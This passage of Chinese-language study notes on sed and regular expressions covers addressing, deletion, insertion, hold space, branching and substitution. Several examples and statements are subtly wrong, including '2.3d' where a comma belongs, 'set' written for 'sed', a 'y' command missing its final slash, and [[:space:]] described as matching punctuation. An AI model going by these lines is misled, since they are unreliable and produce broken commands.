class="code"><pre><code class="hljs awk">$ sed <span class="hljs-string">&#x27;s!/bin/bash!/bin/csh!&#x27;</span> <span class="hljs-regexp">/etc/</span>passwd<br></code></pre></td></tr></table></figure><p>这里用 <code>!</code> 作为分隔符.</p><h3 id="19-2-2-使用地址"><a href="#19-2-2-使用地址" class="headerlink" title="19.2.2 使用地址"></a>19.2.2 使用地址</h3><p>使用行寻址 (line addressing), 将命令作用于特定行或某些行.</p><p>两种形式:</p><ul><li>以数字形式表示行区间</li><li>用文本模式来过滤出行</li></ul><p>格式均为:</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-string">[address]</span>command<br></code></pre></td></tr></table></figure><p>或:</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gcode">address &#123;<br>  comma<span class="hljs-symbol">nd1</span><br>  comma<span class="hljs-symbol">nd2</span><br>  comma<span class="hljs-symbol">nd3</span><br>&#125;<br></code></pre></td></tr></table></figure><p>sed 编辑器会将指定的每条命令作用到匹配指定地址的行上.</p><h4 id="数字形式的行寻址"><a href="#数字形式的行寻址" class="headerlink" title="数字形式的行寻址"></a>数字形式的行寻址</h4><p>可以是行号，也可以是区间:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>sed <span class="hljs-string">&#x27;2s/dog/cat/&#x27;</span> data.txt<br><span class="hljs-variable">$ </span>sed <span class="hljs-string">&#x27;2,3s/dog/cat/&#x27;</span> data.txt<br></code></pre></td></tr></table></figure><p>美元符 <code>$</code> 是特殊地址，表示最后一行.</p><h4 id="使用文本模式过滤器"><a href="#使用文本模式过滤器" class="headerlink" title="使用文本模式过滤器"></a>使用文本模式过滤器</h4><p>格式为:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/pattern/</span>command<br></code></pre></td></tr></table></figure><p>必须用正斜线 <code>/</code> 将指定的 <code>pattern</code> 封起来，sed 编辑器会将命令作用到包含指定文本模式的行上.</p><p>如:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ sed <span class="hljs-string">&#x27;/Samantha/s/bash/csh/&#x27;</span> <span class="hljs-regexp">/etc/</span>passwd<br></code></pre></td></tr></table></figure><p>在前面的文本模式中可以使用正则表达式.</p><h4 id="命令组合"><a href="#命令组合" class="headerlink" title="命令组合"></a>命令组合</h4><p>在单行执行多条命令:</p><figure class="highlight node-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs node-repl">$ sed &#x27;2&#123;<br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">s/fox/elephant/</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">s/dog/cat/</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">&#125;<span class="hljs-string">&#x27; data.txt</span></span><br></code></pre></td></tr></table></figure><h3 id="19-2-3-删除行"><a href="#19-2-3-删除行" class="headerlink" title="19.2.3 删除行"></a>19.2.3 删除行</h3><p>删除命令 <code>d</code>, 它会删除匹配指定寻址模式的所有行。</p><p>删除所有行:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>sed <span class="hljs-string">&#x27;d&#x27;</span> data.txt<br></code></pre></td></tr></table></figure><p>指定行号:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>sed <span class="hljs-string">&#x27;3d&#x27;</span> data.txt<br></code></pre></td></tr></table></figure><p>指定区间:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>sed <span class="hljs-string">&#x27;2.3d&#x27;</span> data.txt<br></code></pre></td></tr></table></figure><p>使用文本模式:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>sed <span class="hljs-string">&#x27;/pattern/d&#x27;</span> data.txt<br></code></pre></td></tr></table></figure><p>使用两个文本模式删除某个区间，第一个文本模式会打开”删除”功能，第二个文本模式匹配结束后会关闭”删除”功能:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>sed <span class="hljs-string">&#x27;/1/,/3/d&#x27;</span> data.txt<br></code></pre></td></tr></table></figure><h3 id="19-2-4-插入和附加文本"><a href="#19-2-4-插入和附加文本" class="headerlink" title="19.2.4 插入和附加文本"></a>19.2.4 插入和附加文本</h3><ul><li>插入 (insert) 命令 (i) 会在指定行前增加一个新行</li><li>附加 (append) 命令 (a) 会在指定行后增加一个新行<br>格式:<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>sed <span class="hljs-string">&#x27;[address]command\ new_line_contents&#x27;</span><br></code></pre></td></tr></table></figure>注意这里是反斜线.</li></ul><p>如:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>sed <span class="hljs-string">&#x27;3i\ This is an insert line&#x27;</span> data.txt<br></code></pre></td></tr></table></figure><p>这样写更清晰:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>sed <span class="hljs-string">&#x27;3i\</span><br><span class="hljs-string">&gt; This is an insert line&#x27;</span> data.txt<br></code></pre></td></tr></table></figure><h3 id="19-2-5-修改行"><a href="#19-2-5-修改行" class="headerlink" title="19.2.5 修改行"></a>19.2.5 修改行</h3><p>修改 (change) 命令允许修改数据流中整行文本的内容，其跟插入和附加命令的工作机制一样.</p><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vhdl">$ sed &#x27;<span class="hljs-number">3</span>c\<br>&gt; This <span class="hljs-keyword">is</span> a changed <span class="hljs-literal">line</span> <span class="hljs-keyword">of</span> <span class="hljs-literal">text</span>&#x27; data.txt<br></code></pre></td></tr></table></figure><p>也可以用文本模式寻址:</p><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vhdl">$ sed &#x27;/pattern/c\<br>&gt; This <span class="hljs-keyword">is</span> a changed <span class="hljs-literal">line</span> <span class="hljs-keyword">of</span> <span class="hljs-literal">text</span>&#x27; data.txt<br></code></pre></td></tr></table></figure><p>若用区间会出问题:</p><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vhdl">$ sed &#x27;<span class="hljs-number">2</span>,<span class="hljs-number">3</span>\c<br>&gt; This <span class="hljs-keyword">is</span> a <span class="hljs-keyword">new</span> <span class="hljs-literal">line</span> <span class="hljs-keyword">of</span> <span class="hljs-literal">text</span>&#x27; data.txt<br></code></pre></td></tr></table></figure><p>其会把 <code>2,3</code> 区间的行改为一行.</p><h3 id="19-2-6-转换命令"><a href="#19-2-6-转换命令" class="headerlink" title="19.2.6 转换命令"></a>19.2.6 转换命令</h3><p>转换 (transform) 命令 (y) 是唯一可以处理单个字符的 sed 编辑器命令。</p><p>格式:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">[address]y<span class="hljs-regexp">/inchars/</span>outchars/<br></code></pre></td></tr></table></figure><p>不要把 <code>inchars</code> 和 <code>outchars</code> 看做一个单词，应为一个个字符，其映射为一一对应，个数不一致会报错:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>sed <span class="hljs-string">&#x27;y/123/456&#x27;</span> data.txt<br></code></pre></td></tr></table></figure><p>文件里面所有的 <code>1</code> 会被替换为 <code>4</code>.</p><h3 id="19-2-7-回顾打印"><a href="#19-2-7-回顾打印" class="headerlink" title="19.2.7 回顾打印"></a>19.2.7 回顾打印</h3><p>用于打印数据流中的信息:</p><ul><li>p命令用来打印文本行</li><li>等号 (&#x3D;) 用来打印行号</li><li>1 (小写的L) 用来列出行</li></ul><h4 id="打印行"><a href="#打印行" class="headerlink" title="打印行"></a>打印行</h4><p>打印指定行地址的行:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>sed -n <span class="hljs-string">&#x27;2,3p&#x27;</span> data.txt<br></code></pre></td></tr></table></figure><p>打印包含文本模式匹配上的行:</p><figure class="highlight node-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs node-repl">$ sed -n &#x27;/pattern/&#123;<br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">p</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">s/line/test/p</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">&#125;<span class="hljs-string">&#x27; data.txt</span></span><br></code></pre></td></tr></table></figure><h4 id="打印行号"><a href="#打印行号" class="headerlink" title="打印行号"></a>打印行号</h4><p>使用 <code>=</code>:</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-symbol">$</span> <span class="hljs-keyword">set</span> <span class="hljs-string">&#x27;=&#x27;</span> data.txt<br></code></pre></td></tr></table></figure><p>sed 在实际文本出现之前打印出行号。</p><figure class="highlight node-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs node-repl">$ set -n &#x27;/number 4/&#123;<br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">=</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">p</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">&#125;<span class="hljs-string">&#x27; data.txt</span></span><br></code></pre></td></tr></table></figure><h4 id="列出行"><a href="#列出行" class="headerlink" title="列出行"></a>列出行</h4><p>列出 (list) 命令 (l) 可以打印数据流中的文本和不可打印的 ASCII 字符。</p><p>任何不可打印字符要么在其八进制值前加一个反斜线，要么使用 C 语言风格的命名法, 如 <code>\t</code>.</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> <span class="hljs-built_in">cat</span> data.txt<br>This  line  contains  tabs<br><span class="hljs-variable">$</span><br><span class="hljs-variable">$</span> sed <span class="hljs-literal">-n</span> <span class="hljs-string">&#x27;l&#x27;</span> data.txt<br>This\tline\tcontains\ttabs<span class="hljs-variable">$</span><br></code></pre></td></tr></table></figure><h3 id="19-2-8-使用-sed-处理文件"><a href="#19-2-8-使用-sed-处理文件" class="headerlink" title="19.2.8 使用 sed 处理文件"></a>19.2.8 使用 sed 处理文件</h3><h4 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h4><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>sed <span class="hljs-string">&#x27;2.3w test.txt&#x27;</span> data.txt<br></code></pre></td></tr></table></figure><h4 id="从文件读取数据"><a href="#从文件读取数据" class="headerlink" title="从文件读取数据"></a>从文件读取数据</h4><p>读取 (read) 命令 (r) 允许将一个独立文件中的数据插入到数据流中。</p><p>格式:</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-string">[address]</span>r filename<br></code></pre></td></tr></table></figure><p>sed 编辑器会将文件中的文本插入到指定地址之后.</p><figure class="highlight node-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs node-repl">$ sed &#x27;/LIST/&#123;<br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">r detail.<span class="hljs-property">txt</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">d</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">&#125;<span class="hljs-string">&#x27; notice.std</span></span><br></code></pre></td></tr></table></figure><p>前面的文本模式对后面的命令都起效果.</p><h1 id="第20章-正则表达式"><a href="#第20章-正则表达式" class="headerlink" title="第20章 正则表达式"></a>第20章 正则表达式</h1><h2 id="20-1-什么是正则表达式"><a href="#20-1-什么是正则表达式" class="headerlink" title="20.1 什么是正则表达式"></a>20.1 什么是正则表达式</h2><h3 id="20-1-1-定义"><a href="#20-1-1-定义" class="headerlink" title="20.1.1 定义"></a>20.1.1 定义</h3><p>正则表达式是你所定义的模式模板 (pattern template), Linux 工具可以用它来过滤文本.</p><h3 id="20-1-2-正则表达式的类型"><a href="#20-1-2-正则表达式的类型" class="headerlink" title="20.1.2 正则表达式的类型"></a>20.1.2 正则表达式的类型</h3><p>正则表达式引擎是一套底层软件, 负责解释正则表达式模式并使用这些模式进行文本匹配.</p><p>sed 编辑器只符合 BRE (Basic Regular Expression) 引擎规范的子集.</p><p>gawk 程序用 ERE (Extended Regular Expression) 引擎来处理它的正则表达式.</p><h2 id="20-2-定义-BRE-模式"><a href="#20-2-定义-BRE-模式" class="headerlink" title="20.2 定义 BRE 模式"></a>20.2 定义 BRE 模式</h2><p>可使用的模式包括:</p><ul><li>^ $ . [] *</li></ul><h3 id="20-2-2-特殊字符"><a href="#20-2-2-特殊字符" class="headerlink" title="20.2.2 特殊字符"></a>20.2.2 特殊字符</h3><p>正则表达式识别的特殊字符包括:</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">.*^<span class="hljs-variable">$&#123;</span>&#125;\+<span class="hljs-string">?|</span>()<br></code></pre></td></tr></table></figure><h3 id="20-2-8-特殊的字符组"><a href="#20-2-8-特殊的字符组" class="headerlink" title="20.2.8 特殊的字符组"></a>20.2.8 特殊的字符组</h3><p>BRE 的特殊的字符组:</p><ul><li>[[:alpha:]], 匹配任意字母字符</li><li>[[:alnum:]], 匹配匹配任意字母和数字字符</li><li>[[:blank:]], 匹配空格或制表符</li><li>[[:digit:]], 匹配 0~9 之间的数字</li><li>[[:lower:]], 匹配小写字母</li><li>[[:print:]], 匹配任意可打印字符</li><li>[[:punct:]], 匹配标点符号</li><li>[[:space:]], 匹配任意标点符号</li><li>[[:upper:]], 匹配大写字符</li></ul><h2 id="20-3-扩展正则表达式"><a href="#20-3-扩展正则表达式" class="headerlink" title="20.3 扩展正则表达式"></a>20.3 扩展正则表达式</h2><p>可使用的包括:</p><ul><li>? + {} | ()</li><li></li></ul><h3 id="20-3-3-使用花括号"><a href="#20-3-3-使用花括号" class="headerlink" title="20.3.3 使用花括号"></a>20.3.3 使用花括号</h3><p>默认情况下 gawk 不会识别正则表达式间隔 (即指定范围), 需指定 <code>--re-interval</code> 命令行选项.</p><h1 id="第21章-sed-进阶"><a href="#第21章-sed-进阶" class="headerlink" title="第21章 sed 进阶"></a>第21章 sed 进阶</h1><h2 id="21-1-多行命令"><a href="#21-1-多行命令" class="headerlink" title="21.1 多行命令"></a>21.1 多行命令</h2><p>三个可用来处理多行文本的特殊命令:</p><ul><li>N : 将数据流中的下一行加进来创建一个多行组 (multiline group) 来处理</li><li>D : 删除多行组中的一行</li><li>P : 打印多行组中的一行</li></ul><h3 id="21-1-1-next-命令"><a href="#21-1-1-next-命令" class="headerlink" title="21.1.1 next 命令"></a>21.1.1 next 命令</h3><h4 id="单行的-next-命令"><a href="#单行的-next-命令" class="headerlink" title="单行的 next 命令"></a>单行的 next 命令</h4><p>小写的 <code>n</code>.</p><p>也就是说, 先找到一行, 然后在其下一行执行命令列表. 之后也是先找, 然后再到下一行执行.</p><h4 id="合并文本行"><a href="#合并文本行" class="headerlink" title="合并文本行"></a>合并文本行</h4><p>单行 next 命令会将数据流中的下一行文本行移动到 sed 编辑器的工作空间 (称为模式空间), 多行版本的 next 命令 (用大写 N) 会将下一文本行添加到模式空间中已有的文本后.</p><p>虽然文本还是用换行符分隔, 但 sed 编辑器现在会将两行文本当成一行来处理.</p><p>在处理完一个模式空间里的文本后, 下一个匹配的行是模式空间之外的行.</p><p>大概是这样, 有一个文件有四行文本:</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">This is <span class="hljs-keyword">the</span> header <span class="hljs-built_in">line</span>.<br>This is <span class="hljs-keyword">the</span> <span class="hljs-keyword">first</span> data <span class="hljs-built_in">line</span>.<br>This is <span class="hljs-keyword">the</span> <span class="hljs-keyword">second</span> data <span class="hljs-built_in">line</span>.<br>This is <span class="hljs-keyword">the</span> <span class="hljs-keyword">last</span> <span class="hljs-built_in">line</span>.<br></code></pre></td></tr></table></figure><p>可以看作:</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">This is <span class="hljs-keyword">the</span> header <span class="hljs-built_in">line</span>.\n<br>This is <span class="hljs-keyword">the</span> <span class="hljs-keyword">first</span> data <span class="hljs-built_in">line</span>.\n<br>This is <span class="hljs-keyword">the</span> <span class="hljs-keyword">second</span> data <span class="hljs-built_in">line</span>.\n<br>This is <span class="hljs-keyword">the</span> <span class="hljs-keyword">last</span> <span class="hljs-built_in">line</span>.\n<br></code></pre></td></tr></table></figure><p>命令为:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sed <span class="hljs-string">&#x27;/first/&#123; N; s/\n/ / &#125;&#x27;</span> data.txt<br></code></pre></td></tr></table></figure><p>相当于是先变成这样:</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">This is <span class="hljs-keyword">the</span> header <span class="hljs-built_in">line</span>.\n<br>This is <span class="hljs-keyword">the</span> <span class="hljs-keyword">first</span> data <span class="hljs-built_in">line</span>.\nThis is <span class="hljs-keyword">the</span> <span class="hljs-keyword">second</span> data <span class="hljs-built_in">line</span>.\n<br>This is <span class="hljs-keyword">the</span> <span class="hljs-keyword">last</span> <span class="hljs-built_in">line</span>.\n<br></code></pre></td></tr></table></figure><p>然后再对 <code>first</code> 这一行, 将第一个 <code>\n</code> 转换成空格. 这就体现出合并.</p><p>要注意 <code>N</code> 命令处理最后一行时的问题, 因为是最后一行, 没有下一行可以合并到模式空间, <code>N</code> 命令会叫 sed 编辑器停止.</p><h3 id="21-1-2-多行删除命令"><a href="#21-1-2-多行删除命令" class="headerlink" title="21.1.2 多行删除命令"></a>21.1.2 多行删除命令</h3><p><code>d</code> 命令是删除一行, 而不是一段文本. 和 <code>N</code> 命令配合时, 会将模式空间中的都删掉.</p><p><code>D</code> 命令是多行删除命令, 其只删除模式空间中的第一行. 该命令会删除到换行符 (含换行符) 为止的所有字符.</p><h3 id="21-1-3-多行打印命令"><a href="#21-1-3-多行打印命令" class="headerlink" title="21.1.3 多行打印命令"></a>21.1.3 多行打印命令</h3><p><code>P</code> 命令是多行打印命令, 它只打印模式空间中的第一行. 这包括模式空间中直到换行符为止的所有的字符.</p><h2 id="21-2-保持空间"><a href="#21-2-保持空间" class="headerlink" title="21.2 保持空间"></a>21.2 保持空间</h2><p>模式空间 (pattern space) 是一块活跃的缓冲区.</p><p>sed 编辑器有另一块称作保持空间 (hold space) 的缓冲区域.</p><p>在处理 pattern space 中的某些行时, 可以用 hold space 来临时保存一些行.</p><p>有 5 条命令可用来操作 hold space:</p><ul><li><code>h</code>, 将 pattern space 复制到 hold space</li><li><code>H</code>, 将 pattern space 附加到 hold space</li><li><code>g</code>, 将 hold space 复制到 pattern space</li><li><code>G</code>, 将 hold space 附加到 pattern space</li><li><code>x</code>, 交换 pattern space 和 hold space 的内容</li></ul><p>通常, 在使用 h 或 H 命令将字符串移动到 hold space 后, 最终还要用 g, G 或 x 命令将保存的字符串移回模式空间.</p><p>复制到, 意思就是会替换掉原本的内容.</p><h2 id="21-3-排除命令"><a href="#21-3-排除命令" class="headerlink" title="21.3 排除命令"></a>21.3 排除命令</h2><p><code>!</code> 命令作为排除 (negate) 命令, 会让原本会其作用的命令起相反作用.</p><p>如:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ sed -n <span class="hljs-string">&#x27;/head/!p&#x27;</span> data2.txt<br></code></pre></td></tr></table></figure><p>会将不包含 <code>head</code> 单词的行打印出来.</p><p><code>$</code> 表示的是特殊地址.</p><p>另一个例子:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ sed <span class="hljs-string">&#x27;$!N; ...&#x27;</span> data.txt<br></code></pre></td></tr></table></figure><p>会对除最后一行的其他行执行 <code>N</code> 命令.</p><p>打印并不会移动缓冲区中的内容.</p><h2 id="21-4-改变流"><a href="#21-4-改变流" class="headerlink" title="21.4 改变流"></a>21.4 改变流</h2><p>通常, sed 编辑器会从脚本的顶部开始, 一直执行到脚本的结尾 (D 命令除外, 它会强制 sed 编辑器返回到脚本的顶部, 而不读取新的行, 毕竟已经删除了一行了, 不可能对删除的行执行剩下的命令).</p><h3 id="21-4-1-分支"><a href="#21-4-1-分支" class="headerlink" title="21.4.1 分支"></a>21.4.1 分支</h3><p>分支 (branch) 命令 <code>b</code> 的格式:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-attr">[address]</span><span class="hljs-selector-tag">b</span> <span class="hljs-selector-attr">[label]</span><br></code></pre></td></tr></table></figure><p><code>address</code> 参数决定了哪些行的数据会触发分支命令. </p><p><code>label</code> 参数定义了要跳转的位置, 如果没有加 label 参数, 跳转命令会跳转到脚本的结尾.</p><p>也就是说, 可以让某些行跳过某些命令而不执行.</p><p>标号以冒号开始, 最多可以是 7 个字符的长度. 要指定标签, 将它加到 <code>b</code> 命令后即可.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ sed <span class="hljs-string">&#x27;&#123;/first/b jump1 ; s/This is the/No jump on/</span><br><span class="hljs-string">&gt; :jump1</span><br><span class="hljs-string">&gt; s/This is the/Jump hero on/&#125;&#x27;</span> data2.txt<br></code></pre></td></tr></table></figure><p>达成循环效果:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;This, is, a, test, to, remove, commas.&quot;</span> | sed -n <span class="hljs-string">&#x27;&#123;</span><br><span class="hljs-string">&gt; :start</span><br><span class="hljs-string">&gt; s/,//1p</span><br><span class="hljs-string">&gt; /,/b start</span><br><span class="hljs-string">&gt; &#125;&#x27;</span><br></code></pre></td></tr></table></figure><p>注意要防止无限循环.</p><p>感觉和汇编的 <code>jmp</code> 指令类似.</p><h3 id="21-4-2-测试"><a href="#21-4-2-测试" class="headerlink" title="21.4.2 测试"></a>21.4.2 测试</h3><p>测试 (test) 命令 <code>t</code>, 也用来改变 sed 编辑器脚本的执行流程.</p><p><code>t</code> 命令根据替换命令的结果跳转到某个标签, 而不是根据地址进行跳转.</p><p>格式:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-attr">[address]</span>t <span class="hljs-selector-attr">[label]</span><br></code></pre></td></tr></table></figure><p>和分支命令一样, 在没有指定标签的情况下, 如果测试成功, sed 回调转到脚本的结尾.</p><p><code>t</code> 命令提供了对数据流中的文本执行基本的 <code>if-then</code> 命令的一个低成本办法:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ sed <span class="hljs-string">&#x27;&#123;</span><br><span class="hljs-string">&gt; s/first/matchd/</span><br><span class="hljs-string">&gt; t</span><br><span class="hljs-string">&gt; s/This is the/No match on/</span><br><span class="hljs-string">&gt; &#125;&#x27;</span> data2.txt<br></code></pre></td></tr></table></figure><p>这个例子为, 如果第一个替换执行了, 就不会执行第二个.</p><p>可以用测试命令来结束循环.</p><h2 id="21-5-模式代替"><a href="#21-5-模式代替" class="headerlink" title="21.5 模式代替"></a>21.5 模式代替</h2><h3 id="21-5-1-amp-符号"><a href="#21-5-1-amp-符号" class="headerlink" title="21.5.1 &amp; 符号"></a>21.5.1 &amp; 符号</h3><p><code>&amp;</code> 符号可以用来代替命令中的匹配的模式. </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;The cat sleeps in his hat.&quot;</span> | sed <span class="hljs-string">&#x27;s/.at/&quot;&amp;&quot;/g&#x27;</span><br></code></pre></td></tr></table></figure><p>匹配到了 <code>cat</code>, 那么 <code>&amp;</code> 的值为 <code>cat</code>, 匹配到后面的 <code>hat</code>, 则 <code>&amp;</code> 的值为 <code>hat</code>.</p><h3 id="21-5-2-代替单独的单词"><a href="#21-5-2-代替单独的单词" class="headerlink" title="21.5.2 代替单独的单词"></a>21.5.2 代替单独的单词</h3><p>sed 编辑器用圆括号来定义替换模式中的子模式.</p><p>替代字符由反斜线和数字组成, 数字表明子模式的位置, 如 <code>\1</code>, <code>\2</code>.</p><p>在替换命令中使用圆括号时, 必须用转移字符将它们标示为分组字符而不是普通的圆括号, 这有点反常:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;The System Administrator manual&quot;</span> | sed <span class="hljs-string">&#x27;</span><br><span class="hljs-string">&gt; s/\(System\) Administrator/\1 User/&#x27;</span><br></code></pre></td></tr></table></figure><p>正则表达式的 <code>*</code> 放在文本的后面.</p><h2 id="21-6-在脚本中使用-sed"><a href="#21-6-在脚本中使用-sed" class="headerlink" title="21.6 在脚本中使用 sed"></a>21.6 在脚本中使用 sed</h2><h3 id="21-6-1-使用包装脚本"><a href="#21-6-1-使用包装脚本" class="headerlink" title="21.6.1 使用包装脚本"></a>21.6.1 使用包装脚本</h3><p>在 shell 脚本中, 可以将普通的 shell 变量及参数和 sed 编辑器脚本一起使用:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#! /bin/bash</span><br>sed -n <span class="hljs-string">&#x27;&#123; 1!G ; h ; $p&#125;&#x27;</span> <span class="hljs-variable">$1</span> <br></code></pre></td></tr></table></figure><p>这个把命令行的第一个参数 (这里可以是文件名) 当成 sed 的输入. 这里的 <code>$p</code> 的含义是, 只有最后一行才打印. <code>p</code> 是一个动作.</p><h3 id="21-6-2-重定向-sed-的输出"><a href="#21-6-2-重定向-sed-的输出" class="headerlink" title="21.6.2 重定向 sed 的输出"></a>21.6.2 重定向 sed 的输出</h3><p>默认情况下, sed 编辑器会将脚本的结果输出到 STDOUT 上, 可以在 shell 脚本中使用各种标准方法对 sed 编辑器的输出进行重定向.</p><p>如用 <code>$()</code> 重定向到变量中.</p><h2 id="21-7-创建-sed-实用工具"><a href="#21-7-创建-sed-实用工具" class="headerlink" title="21.7 创建 sed 实用工具"></a>21.7 创建 sed 实用工具</h2><h3 id="21-7-1-加倍行间距"><a href="#21-7-1-加倍行间距" class="headerlink" title="21.7.1 加倍行间距"></a>21.7.1 加倍行间距</h3><p>保持空间的默认值为一个空行.</p><h3 id="21-7-2-对可能含有空白行的文件加倍行间距"><a href="#21-7-2-对可能含有空白行的文件加倍行间距" class="headerlink" title="21.7.2 对可能含有空白行的文件加倍行间距"></a>21.7.2 